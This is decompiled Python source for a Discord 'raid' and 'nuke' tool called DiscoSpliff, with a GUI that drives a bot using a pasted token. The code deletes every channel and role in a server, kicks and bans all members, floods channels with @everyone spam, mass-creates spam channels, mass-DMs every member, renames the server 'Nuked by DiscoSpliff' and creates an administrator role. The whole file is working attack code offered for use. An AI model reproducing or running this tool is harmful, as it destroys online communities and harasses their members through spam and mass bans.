# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'discordtool.py'
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import customtkinter as ctk
import discord
from discord.ext import commands
import asyncio
import threading
import re
import datetime
import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime, UTC
ctk.set_appearance_mode('dark')
ctk.set_default_color_theme('dark-blue')
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.presences = False
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
async def clone_server(source_guild_id, destination_guild_id, options, app):
    source = bot.get_guild(source_guild_id)
    dest = bot.get_guild(destination_guild_id)
    if not source or not dest:
        app.log('[ERROR] Source or destination server not found.')
        return
    else:
        app.log(f'[INFO] Cloning server {source_guild_id} → {destination_guild_id} with options {options}')
        if options.get('clone_roles', False):
            app.log('[INFO] Cloning roles...')
            roles_created = 0
            for role in source.roles:
                if role.name!= '@everyone':
                    try:
                        await dest.create_role(name=role.name, permissions=role.permissions, colour=role.color)
                        roles_created += 1
                        app.log(f'[OK] Role cloned: {role.name}')
                    except Exception as e:
                        app.log(f'[ERROR] Failed to clone role {role.name}: {e}')
                    else:
                        pass
            app.log(f'[INFO] {roles_created} roles cloned.')
        if options.get('clone_channels', False):
            app.log('[INFO] Cloning channels and categories...')
            category_map = {}
            categories_created = 0
            channels_created = 0
            for category in [c for c in source.categories]:
                try:
                    new_cat = await dest.create_category(category.name)
                    category_map[category.id] = new_cat
                    categories_created += 1
                    app.log(f'[OK] Category cloned: {category.name}')
                except Exception as e:
                    app.log(f'[ERROR] Failed to clone category {category.name}: {e}')
                else:
                    pass
            for channel in source.channels:
                try:
                    if isinstance(channel, discord.TextChannel):
                        if channel.category:
                            parent = category_map.get(channel.category.id)
                            await dest.create_text_channel(channel.name, category=parent)
                        else:
                            await dest.create_text_channel(channel.name)
                    else:
                        if isinstance(channel, discord.VoiceChannel):
                            if channel.category:
                                parent = category_map.get(channel.category.id)
                                await dest.create_voice_channel(channel.name, category=parent)
                            else:
                                await dest.create_voice_channel(channel.name)
                    channels_created += 1
                    app.log(f'[OK] Channel cloned: {channel.name}')
                except Exception as e:
                    app.log(f'[ERROR] Failed to clone channel {channel.name}: {e}')
                else:
                    pass
            app.log(f'[INFO] {categories_created} categories and {channels_created} channels cloned.')
async def raid_guild(guild_id, options, app):
    guild = bot.get_guild(guild_id)
    if guild is None:
        app.log(f'[ERROR] Server {guild_id} not found.')
        return
    app.log(f'[INFO] Starting raid on server: {guild.name} ({guild.id})')
    channel_prefix = options.get('channel_prefix', 'raid')
    if options.get('create_channels', False):
        if not channel_prefix:
            app.log('[ERROR] Channel prefix cannot be empty.')
            return
        elif len(channel_prefix) > 80 or not re.match('^[\\w-]+$', channel_prefix):
            app.log('[ERROR] Prefix must be alphanumeric (max 80 chars, no / or \\).')
            return
    channels_deleted = 0
    roles_deleted = 0
    members_kicked = 0
    members_banned = 0
    channels_created = 0
    if options.get('delete_channels', False):
        app.log('[INFO] Deleting channels...')
        for channel in guild.channels:
            try:
                await channel.delete()
                channels_deleted += 1
                app.log(f'[OK] Channel deleted: {channel.name}')
            except Exception as e:
                app.log(f'[ERROR] Failed to delete channel {channel.name}: {e}')
            else:
                pass
        app.log(f'[INFO] {channels_deleted} channels deleted.')
    if options.get('delete_roles', False):
        app.log('[INFO] Deleting roles...')
        for role in guild.roles:
            if role.name!= '@everyone':
                try:
                    await role.delete()
                    roles_deleted += 1
                    app.log(f'[OK] Role deleted: {role.name}')
                except Exception as e:
                    app.log(f'[ERROR] Failed to delete role {role.name}: {e}')
                else:
                    pass
        app.log(f'[INFO] {roles_deleted} roles deleted.')
    if options.get('kick_members', False):
        app.log('[INFO] Kicking members...')
        for member in guild.members:
            if member!= bot.user:
                try:
                    await member.kick(reason='Raid by DiscoSpliff')
                    members_kicked += 1
                    app.log(f'[OK] Member kicked: {member.name}')
                except Exception as e:
                    app.log(f'[ERROR] Failed to kick member {member.name}: {e}')
                else:
                    pass
        app.log(f'[INFO] {members_kicked} members kicked.')
    if options.get('ban_members', False):
        app.log('[INFO] Banning members...')
        for member in guild.members:
            if member!= bot.user:
                try:
                    await member.ban(reason='Raid by DiscoSpliff')
                    members_banned += 1
                    app.log(f'[OK] Member banned: {member.name}')
                except Exception as e:
                    app.log(f'[ERROR] Failed to ban member {member.name}: {e}')
                else:
                    pass
        app.log(f'[INFO] {members_banned} members banned.')
    if options.get('spam_everyone', False):
        app.log('[INFO] Spamming @everyone in all channels (limited to 10 messages per channel)...')
        spam_message = options.get('spam_message', '@everyone Raid by DiscoSpliff!')
        for channel in guild.text_channels:
            try:
                for _ in range(10):
                    await channel.send(spam_message)
                    app.log(f'[OK] Spam sent in {channel.name}: {spam_message}')
                    await asyncio.sleep(1)
            except Exception as e:
                app.log(f'[ERROR] Failed to spam in {channel.name}: {e}')

    if options.get('create_channels', False):
        app.log('[INFO] Creating channels with spam...')
        
        async def spam_in_channel(channel, message):
            for _ in range(10):
                try:
                    await channel.send(message)
                    app.log(f'[OK] Spam sent in {channel.name}: {message}')
                    await asyncio.sleep(1)
                except Exception as e:
                    app.log(f'[ERROR] Failed to spam in {channel.name}: {e}')
                    return
        
        max_channels = 50
        for i in range(1, max_channels + 1):
            channel_name = f'{channel_prefix}-{i}'
            try:
                channel = await guild.create_text_channel(channel_name)
                channels_created += 1
                app.log(f'[OK] Channel created: {channel_name}')
                asyncio.create_task(spam_in_channel(channel, options.get('channel_message', 'Raid in progress!')))
                await asyncio.sleep(2)
            except discord.errors.HTTPException as e:
                app.log(f'[ERROR] Failed to create channel {channel_name}: {e}')
                if e.code == 429:
                    retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
                    app.log(f'[INFO] Rate limit hit, waiting {retry_after} seconds...')
                    await asyncio.sleep(retry_after)
            except Exception as e:
                app.log(f'[ERROR] Failed to create channel {channel_name}: {e}')
        
        app.log(f'[INFO] {channels_created} channels created.')

    app.log('[INFO] Raid completed! Summary:')
    app.log(f'- {channels_deleted} channels deleted')
    app.log(f'- {roles_deleted} roles deleted')
    app.log(f'- {members_kicked} members kicked')
    app.log(f'- {members_banned} members banned')
    app.log(f'- {channels_created} channels created.')
async def create_custom_channels(guild_id, channels, category_name, app):
    guild = bot.get_guild(guild_id)
    if guild is None:
        app.log('[ERROR] Server not found.')
        return
    else:
        category = None
        if category_name:
            if not re.match('^[\\w-]+$', category_name) or len(category_name) > 100:
                app.log(f'[ERROR] Invalid category name: {category_name} (max 100 chars, alphanumeric only).')
            else:
                try:
                    category = await guild.create_category(category_name)
                    app.log(f'[OK] Category created: {category_name}')
                except Exception as e:
                    app.log(f'[ERROR] Failed to create category {category_name}: {e}')
        channels_created = 0
        for name in channels:
            if not re.match('^[\\w-]+$', name) or len(name) > 100:
                app.log(f'[ERROR] Invalid channel name: {name} (max 100 chars, alphanumeric only).')
                continue
            else:
                try:
                    await guild.create_text_channel(name, category=category)
                    channels_created += 1
                    app.log(f'[OK] Channel created: {name}')
                except Exception as e:
                    app.log(f'[ERROR] Failed to create channel {name}: {e}')
                else:
                    pass
        app.log(f'[INFO] {channels_created} channels created.')
async def advanced_features(guild_id, options, app):
    guild = bot.get_guild(guild_id)
    if not guild:
        app.log('[ERROR] Server not found.')
        return
    else:
        if options.get('mass_dm', False):
            app.log('[INFO] Sending mass DMs...')
            message = options.get('dm_message', 'Test message')
            dms_sent = 0
            for member in guild.members:
                if member!= bot.user and (not member.bot):
                        try:
                            await member.send(message)
                            dms_sent += 1
                            app.log(f'[OK] DM sent to {member.name}')
                            await asyncio.sleep(2)
                        except Exception as e:
                            app.log(f'[ERROR] Failed to send DM to {member.name}: {e}')
                        else:
                            pass
            app.log(f'[INFO] {dms_sent} DMs sent.')
        if options.get('server_nuke', False):
            app.log('[INFO] Starting server nuke...')
            channels_deleted = 0
            roles_deleted = 0
            try:
                for channel in guild.channels:
                    try:
                        await channel.delete()
                        channels_deleted += 1
                        app.log(f'[OK] Channel deleted: {channel.name}')
                    except Exception as e:
                        app.log(f'[ERROR] Failed to delete channel {channel.name}: {e}')
                    else:
                        pass
                for role in guild.roles:
                    if role.name!= '@everyone':
                        try:
                            await role.delete()
                            roles_deleted += 1
                            app.log(f'[OK] Role deleted: {role.name}')
                        except Exception as e:
                            app.log(f'[ERROR] Failed to delete role {role.name}: {e}')
                        else:
                            pass
                try:
                    await guild.edit(name='Nuked by DiscoSpliff')
                    app.log('[OK] Server name changed.')
                except Exception as e:
                    app.log(f'[ERROR] Failed to change server name: {e}')
                app.log(f'[INFO] Nuke completed: {channels_deleted} channels deleted, {roles_deleted} roles deleted.')
            except Exception as e:
                app.log(f'[ERROR] Error during nuke: {e}')
        if options.get('perm_overwrite', False):
            app.log('[INFO] Overwriting permissions...')
            role_name = options.get('perm_role', 'Admin')
            perms_modified = 0
            try:
                role = discord.utils.get(guild.roles, name=role_name)
                if not role:
                    role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
                    app.log(f'[OK] Role created: {role_name}')
                for channel in guild.channels:
                    try:
                        await channel.set_permissions(role, send_messages=True, read_messages=True, manage_channels=True)
                        perms_modified += 1
                        app.log(f'[OK] Permissions updated for {channel.name}')
                    except Exception as e:
                        app.log(f'[ERROR] Failed to update permissions for {channel.name}: {e}')
                    else:
                        pass
                app.log(f'[INFO] {perms_modified} channels had permissions updated.')
            except Exception as e:
                app.log(f'[ERROR] Error during permission overwrite: {e}')
        if options.get('schedule_message', False):
            app.log('[INFO] Scheduling messages...')
            channel_id = options.get('schedule_channel_id')
            message = options.get('schedule_message_text', 'Scheduled message!')
            delay = options.get('schedule_delay', 60)
            channel = guild.get_channel(channel_id)
            if not channel:
                app.log(f'[ERROR] Channel {channel_id} not found.')
                return
            else:
                try:
                    await asyncio.sleep(delay)
                    await channel.send(message)
                    app.log(f'[OK] Scheduled message sent in {channel.name}: {message}')
                except Exception as e:
                    app.log(f'[ERROR] Failed to send scheduled message: {e}')
class DiscoSpliffApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title('DiscoSpliff')
        self.geometry('550x600')
        self.resizable(False, False)
        self.configure(fg_color='#1C2526')
        main_frame = ctk.CTkFrame(self, fg_color='#1C2526', corner_radius=0)
        main_frame.pack(fill='both', expand=True)
        self.label = ctk.CTkLabel(main_frame, text='DiscoSpliff', font=('Arial', 18, 'bold'), text_color='#FF5555')
        self.label.pack(pady=10)
        self.tabview = ctk.CTkTabview(main_frame, width=500, height=300, corner_radius=8, fg_color='#2D3839', segmented_button_selected_color='#FF5555')
        self.tabview.pack(pady=10)
        self.tab_clone = self.tabview.add('Clone')
        self.tab_raid = self.tabview.add('Raid')
        self.tab_custom = self.tabview.add('Custom')
        self.tab_advanced = self.tabview.add('Advanced')
        self.clone_frame = ctk.CTkFrame(self.tab_clone, fg_color='#2D3839', corner_radius=8)
        self.clone_frame.pack(pady=10, padx=10, fill='both')
        self.clone_frame.grid_columnconfigure((0, 1), weight=1)
        self.source_entry = ctk.CTkEntry(self.clone_frame, placeholder_text='Source Guild ID', width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.source_entry.grid(row=0, column=0, padx=5, pady=5, sticky='ew')
        self.dest_entry = ctk.CTkEntry(self.clone_frame, placeholder_text='Destination Guild ID', width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.dest_entry.grid(row=0, column=1, padx=5, pady=5, sticky='ew')
        self.clone_roles_var = ctk.BooleanVar(value=False)
        self.clone_channels_var = ctk.BooleanVar(value=False)
        self.clone_members_var = ctk.BooleanVar(value=False)
        self.assign_roles_var = ctk.BooleanVar(value=False)
        self.clone_roles_checkbox = ctk.CTkCheckBox(self.clone_frame, text='Clone Roles', variable=self.clone_roles_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.clone_roles_checkbox.grid(row=1, column=0, padx=5, pady=3, sticky='w')
        self.clone_channels_checkbox = ctk.CTkCheckBox(self.clone_frame, text='Clone Channels', variable=self.clone_channels_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.clone_channels_checkbox.grid(row=1, column=1, padx=5, pady=3, sticky='w')
        self.clone_members_checkbox = ctk.CTkCheckBox(self.clone_frame, text='Clone Members', variable=self.clone_members_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.clone_members_checkbox.grid(row=2, column=0, padx=5, pady=3, sticky='w')
        self.assign_roles_checkbox = ctk.CTkCheckBox(self.clone_frame, text='Assign Roles', variable=self.assign_roles_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.assign_roles_checkbox.grid(row=2, column=1, padx=5, pady=3, sticky='w')
        self.clone_button = ctk.CTkButton(self.clone_frame, text='Clone Server', command=self.clone_server, fg_color='#FF5555', hover_color='#FF7777', width=150, height=35)
        self.clone_button.grid(row=3, column=0, columnspan=2, pady=10)
        self.raid_frame = ctk.CTkFrame(self.tab_raid, fg_color='#2D3839', corner_radius=8)
        self.raid_frame.pack(pady=10, padx=10, fill='both')
        self.raid_frame.grid_columnconfigure((0, 1), weight=1)
        self.raid_entry = ctk.CTkEntry(self.raid_frame, placeholder_text='Guild ID', width=360, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.raid_entry.grid(row=0, column=0, columnspan=2, padx=5, pady=5, sticky='ew')
        self.delete_channels_var = ctk.BooleanVar(value=False)
        self.delete_roles_var = ctk.BooleanVar(value=False)
        self.kick_members_var = ctk.BooleanVar(value=False)
        self.ban_members_var = ctk.BooleanVar(value=False)
        self.spam_everyone_var = ctk.BooleanVar(value=False)
        self.create_channels_var = ctk.BooleanVar(value=False)
        self.delete_channels_checkbox = ctk.CTkCheckBox(self.raid_frame, text='Delete Channels', variable=self.delete_channels_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.delete_channels_checkbox.grid(row=1, column=0, padx=5, pady=3, sticky='w')
        self.delete_roles_checkbox = ctk.CTkCheckBox(self.raid_frame, text='Delete Roles', variable=self.delete_roles_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.delete_roles_checkbox.grid(row=1, column=1, padx=5, pady=3, sticky='w')
        self.kick_members_checkbox = ctk.CTkCheckBox(self.raid_frame, text='Kick Members', variable=self.kick_members_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.kick_members_checkbox.grid(row=2, column=0, padx=5, pady=3, sticky='w')
        self.ban_members_checkbox = ctk.CTkCheckBox(self.raid_frame, text='Ban Members', variable=self.ban_members_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.ban_members_checkbox.grid(row=2, column=1, padx=5, pady=3, sticky='w')
        self.spam_frame = ctk.CTkFrame(self.raid_frame, fg_color='#2D3839', corner_radius=8)
        self.spam_frame.grid(row=3, column=0, columnspan=2, pady=5, sticky='ew')
        self.spam_frame.grid_columnconfigure((0, 1), weight=1)
        self.spam_everyone_checkbox = ctk.CTkCheckBox(self.spam_frame, text='Spam @everyone', variable=self.spam_everyone_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.spam_everyone_checkbox.grid(row=0, column=0, padx=5, pady=3, sticky='w')
        self.spam_message_entry = ctk.CTkEntry(self.spam_frame, placeholder_text='Spam Message', width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.spam_message_entry.grid(row=0, column=1, padx=5, pady=3, sticky='ew')
        self.create_channels_checkbox = ctk.CTkCheckBox(self.spam_frame, text='Create Channels', variable=self.create_channels_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.create_channels_checkbox.grid(row=1, column=0, padx=5, pady=3, sticky='w')
        self.channel_message_entry = ctk.CTkEntry(self.spam_frame, placeholder_text='Channel Spam Message', width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.channel_message_entry.grid(row=1, column=1, padx=5, pady=3, sticky='ew')
        self.channel_prefix_entry = ctk.CTkEntry(self.spam_frame, placeholder_text='Channel Prefix (e.g., spliff)', width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.channel_prefix_entry.grid(row=2, column=0, columnspan=2, padx=5, pady=3, sticky='ew')
        self.raid_button = ctk.CTkButton(self.raid_frame, text='Launch Raid', command=self.raid_server, fg_color='#FF5555', hover_color='#FF7777', width=150, height=35)
        self.raid_button.grid(row=4, column=0, columnspan=2, pady=10)
        self.custom_frame = ctk.CTkFrame(self.tab_custom, fg_color='#2D3839', corner_radius=8)
        self.custom_frame.pack(pady=10, padx=10, fill='both')
        self.custom_frame.grid_columnconfigure(0, weight=1)
        self.custom_guild_entry = ctk.CTkEntry(self.custom_frame, placeholder_text='Guild ID', width=360, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.custom_guild_entry.grid(row=0, column=0, padx=5, pady=5, sticky='ew')
        self.category_name_entry = ctk.CTkEntry(self.custom_frame, placeholder_text='Category Name (optional)', width=360, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.category_name_entry.grid(row=1, column=0, padx=5, pady=5, sticky='ew')
        self.channel_names_entry = ctk.CTkEntry(self.custom_frame, placeholder_text='Channel Names (comma-separated)', width=360, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.channel_names_entry.grid(row=2, column=0, padx=5, pady=5, sticky='ew')
        self.custom_button = ctk.CTkButton(self.custom_frame, text='Create Channels', command=self.create_custom_channels, fg_color='#FF5555', hover_color='#FF7777', width=150, height=35)
        self.custom_button.grid(row=3, column=0, pady=10)
        self.adv_frame = ctk.CTkFrame(self.tab_advanced, fg_color='#2D3839', corner_radius=8)
        self.adv_frame.pack(pady=10, padx=10, fill='both')
        self.adv_frame.grid_columnconfigure((0, 1), weight=1)
        self.adv_guild_entry = ctk.CTkEntry(self.adv_frame, placeholder_text='Guild ID', width=360, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.adv_guild_entry.grid(row=0, column=0, columnspan=2, padx=5, pady=5, sticky='ew')
        self.mass_dm_var = ctk.BooleanVar(value=False)
        self.server_nuke_var = ctk.BooleanVar(value=False)
        self.perm_overwrite_var = ctk.BooleanVar(value=False)
        self.schedule_message_var = ctk.BooleanVar(value=False)
        self.mass_dm_checkbox = ctk.CTkCheckBox(self.adv_frame, text='Mass DM', variable=self.mass_dm_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.mass_dm_checkbox.grid(row=1, column=0, padx=5, pady=3, sticky='w')
        self.dm_message_entry = ctk.CTkEntry(self.adv_frame, placeholder_text='DM Message', width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.dm_message_entry.grid(row=1, column=1, padx=5, pady=3, sticky='ew')
        self.server_nuke_checkbox = ctk.CTkCheckBox(self.adv_frame, text='Server Nuke', variable=self.server_nuke_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.server_nuke_checkbox.grid(row=2, column=0, padx=5, pady=3, sticky='w')
        self.perm_overwrite_checkbox = ctk.CTkCheckBox(self.adv_frame, text='Permission Overwrite', variable=self.perm_overwrite_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.perm_overwrite_checkbox.grid(row=3, column=0, padx=5, pady=3, sticky='w')
        self.perm_role_entry = ctk.CTkEntry(self.adv_frame, placeholder_text='Role Name (e.g., Admin)', width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.perm_role_entry.grid(row=3, column=1, padx=5, pady=3, sticky='ew')
        self.schedule_message_checkbox = ctk.CTkCheckBox(self.adv_frame, text='Schedule Message', variable=self.schedule_message_var, text_color='#FFFFFF', checkbox_width=20, checkbox_height=20)
        self.schedule_message_checkbox.grid(row=4, column=0, padx=5, pady=3, sticky='w')
        self.schedule_message_entry = ctk.CTkEntry(self.adv_frame, placeholder_text='Scheduled Message', width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.schedule_message_entry.grid(row=4, column=1, padx=5, pady=3, sticky='ew')
        self.schedule_channel_entry = ctk.CTkEntry(self.adv_frame, placeholder_text='Channel ID', width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.schedule_channel_entry.grid(row=5, column=0, padx=5, pady=3, sticky='ew')
        self.schedule_delay_entry = ctk.CTkEntry(self.adv_frame, placeholder_text='Delay in Seconds', width=180, height=30, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.schedule_delay_entry.grid(row=5, column=1, padx=5, pady=3, sticky='ew')
        self.adv_button = ctk.CTkButton(self.adv_frame, text='Run Advanced', command=self.run_advanced, fg_color='#FF5555', hover_color='#FF7777', width=150, height=35)
        self.adv_button.grid(row=6, column=0, columnspan=2, pady=10)
        self.token_frame = ctk.CTkFrame(main_frame, fg_color='#1C2526', corner_radius=8)
        self.token_frame.pack(pady=10, padx=10, fill='x')
        self.token_entry = ctk.CTkEntry(self.token_frame, placeholder_text='Bot Token', width=360, height=30, fg_color='#3A4A4B', text_color='#FFFFFF', show='*')
        self.token_entry.pack(pady=5, padx=5)
        self.connect_button = ctk.CTkButton(self.token_frame, text='Connect', command=self.run_bot, fg_color='#00AA00', hover_color='#00CC00', width=150, height=35)
        self.connect_button.pack(pady=5)
        self.log_textbox = ctk.CTkTextbox(main_frame, width=500, height=120, fg_color='#3A4A4B', text_color='#FFFFFF')
        self.log_textbox.pack(pady=10, padx=10)
        self.log_textbox.configure(state='disabled')
        self.bot_loop = None
    def log(self, message):
        self.log_textbox.configure(state='normal')
        self.log_textbox.insert('end', message + '\n')
        self.log_textbox.see('end')
        self.log_textbox.configure(state='disabled')
    def clone_server(self):
        try:
            source_guild_id = int(self.source_entry.get())
            destination_guild_id = int(self.dest_entry.get())
            options = {'clone_roles': self.clone_roles_var.get(), 'clone_channels': self.clone_channels_var.get(), 'clone_members': self.clone_members_var.get(), 'assign_roles': self.assign_roles_var.get()}
            if self.bot_loop:
                asyncio.run_coroutine_threadsafe(clone_server(source_guild_id, destination_guild_id, options, self), self.bot_loop)
            else:
                self.log('[ERROR] Bot not connected. Please click \'Connect\' first.')
        except ValueError:
            self.log('[ERROR] Please enter valid Guild IDs.')

    def raid_server(self):
        try:
            guild_id = int(self.raid_entry.get())
            options = {'delete_channels': self.delete_channels_var.get(), 'delete_roles': self.delete_roles_var.get(), 'kick_members': self.kick_members_var.get(), 'ban_members': self.ban_members_var.get(), 'spam_everyone': self.spam_everyone_var.get(), 'spam_message': self.spam_message_entry.get(), 'create_channels': self.create_channels_var.get(), 'channel_message': self.channel_message_entry.get() or 'Raid in progress!', 'channel_prefix': self.channel_prefix_entry.get() or 'spliff'}
            if self.bot_loop:
                asyncio.run_coroutine_threadsafe(raid_guild(guild_id, options, self), self.bot_loop)
            else:
                self.log('[ERROR] Bot not connected. Please click \'Connect\' first.')
        except ValueError:
            self.log('[ERROR] Please enter a valid Guild ID.')

    def create_custom_channels(self):
        try:
            guild_id = int(self.custom_guild_entry.get())
            channel_names = [name.strip() for name in self.channel_names_entry.get().split(',') if name.strip()]
            category_name = self.category_name_entry.get().strip()
            if self.bot_loop:
                asyncio.run_coroutine_threadsafe(create_custom_channels(guild_id, channel_names, category_name, self), self.bot_loop)
            else:
                self.log('[ERROR] Bot not connected. Please click \'Connect\' first.')
        except ValueError:
            self.log('[ERROR] Please enter a valid Guild ID.')
    def run_advanced(self):
        try:
            guild_id = int(self.adv_guild_entry.get())
            options = {'mass_dm': self.mass_dm_var.get(), 'dm_message': self.dm_message_entry.get() or 'Test message', 'server_nuke': self.server_nuke_var.get(), 'perm_overwrite': self.perm_overwrite_var.get(), 'perm_role': self.perm_role_entry.get(), 'schedule_message': self.schedule_message_var.get(), 'schedule_message_text': self.schedule_message_entry.get(), 'schedule_channel_id': int(self.schedule_channel_entry.get()) if self.schedule_channel_entry.get() else None, 'schedule_delay': int(self.schedule_delay_entry.get()) if self.schedule_delay_entry.get() else 60}
            if self.bot_loop:
                asyncio.run_coroutine_threadsafe(advanced_features(guild_id, options, self), self.bot_loop)
            else:
                self.log('[ERROR] Bot not connected. Please click \'Connect\' first.')
        except ValueError:
            self.log('[ERROR] Please enter a valid Guild ID and values.')

    def run_bot(self):
        token = self.token_entry.get().strip()
        if not token:
            self.log('[ERROR] Please enter a valid token.')
            return
        else:
            self.log('[INFO] Attempting to connect bot...')
            self.connect_button.configure(state='disabled')
            threading.Thread(target=self._start_bot_thread, args=(token,), daemon=True).start()
    def _start_bot_thread(self, token):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        self.bot_loop = loop
        try:
            loop.run_until_complete(bot.start(token))
        except discord.errors.LoginFailure:
            self.log('[ERROR] Invalid token. Please check the token entered.')
            self.connect_button.configure(state='normal')
        except discord.errors.HTTPException as e:
            self.log(f'[ERROR] HTTP error during connection: {e}')
            self.connect_button.configure(state='normal')
        except Exception as e:
            self.log(f'[ERROR] Bot connection failed: {e}')
            self.connect_button.configure(state='normal')
@bot.event
async def on_ready():
    print(f'[INFO] Bot ready as {bot.user}')
    for app in threading.enumerate():
        if hasattr(app, 'log'):
            app.log(f'[INFO] Bot connected as {bot.user}')
if __name__ == '__main__':
    def clear_screen():
        if os.name == 'posix':
            os.system('clear')
        else:
            os.system('cls')
    clear_screen()
    app = DiscoSpliffApp()
    app.mainloop()